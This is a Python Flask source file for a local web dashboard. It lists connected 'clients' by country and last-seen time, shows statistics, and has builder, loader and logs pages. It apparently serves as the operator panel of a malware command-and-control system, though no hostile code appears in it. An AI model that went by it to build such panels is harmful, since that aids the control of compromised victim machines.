from flask import Flask, render_template
import httpx
import json
from cryptography.hazmat.primitives import padding
import secrets
import random
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import base64
import time

def convert_to_ago(timestamp):
    def add0(intInput):
        intInput = str(intInput)
        if len(intInput) == 1:
            return " " + intInput
        else:
            return intInput

    delta = int(time.time()) - int(timestamp)
    if delta <= 60 :
        return f"{add0(int(delta))}s"
    elif delta <= 3600:
        return f"{add0(int(delta / 60))}m"
    elif delta <= 86400:
        return f"{add0(int(delta / 3600))}h"
    else:
        return f"{add0(int(delta / 86400))}d"

SERVER_ADDRESS = "http://127.0.0.1:9999"
API_SECRET = "debug"

app = Flask(__name__)

@app.route("/clients")
def clients():
    c_time = time.time()
    client_list_response = httpx.post(SERVER_ADDRESS + "/api/clients_list", json={"api_secret": API_SECRET})
    client_list = client_list_response.text

    s_time = time.time()
    statistics_response = httpx.post(SERVER_ADDRESS + "/api/statistics", json={"api_secret": API_SECRET})
    statistics = json.loads(statistics_response.text)
    
    p_time = time.time()
    new_client_data = []
    for client_id, client_data in json.loads(client_list).items():

        client_data["last_seen"] = convert_to_ago(client_data["last_seen"])
        
        if client_data["country"] == "-":
            client_data["country"] = "NL"

        client_data["client_id"] = client_id
        new_client_data.append(client_data)
    

    if statistics["last_new_client"] == 0:
        statistics["last_new_client"] = "N/A"
    else:
        statistics["last_new_client"] = convert_to_ago(statistics["last_new_client"])

    print(f"Time for client_list: {time.time() - c_time}\nTime for stats request: {time.time() - s_time}\nTime for processing: {time.time() - p_time}\n")

    return render_template("clients.html", client_list=new_client_data, statistics=statistics)

@app.route("/builder")
def builder():
    return render_template("builder.html")

@app.route("/loader")
def loader():
    return render_template("loader.html")

@app.route("/logs")
def logs():
    return render_template("logs.html")

app.run("127.0.0.1", 6767)
